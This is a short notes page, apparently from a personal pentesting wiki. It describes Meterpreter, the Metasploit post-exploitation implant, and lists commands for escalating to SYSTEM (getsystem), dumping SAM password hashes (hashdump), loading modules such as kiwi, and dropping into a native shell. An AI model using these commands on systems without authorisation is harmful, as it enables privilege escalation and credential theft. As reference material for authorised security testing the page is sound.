Meterpreter is an implant and framework used in conjunction with [[Metasploit]]'s `exploit/multi/handler` handler framework. 

Some useful commands include:
```shell
getsystem # Attempt to escalate to NT AUTHORITY\SYSTEM via saveral common misconfigurations
hashdump # Dump hashes from the local SAM (requires SYSTEM privileges)
load # Load any of many helpful modules (kiwi O.O)
netstat # Display network adapter information
arp # Display client ARP table
shell # Drop into a native shell to use the client's command line raw. Helpful if functionality is not replicated into Meterpreter, like domain enumeration via LOLBins
```
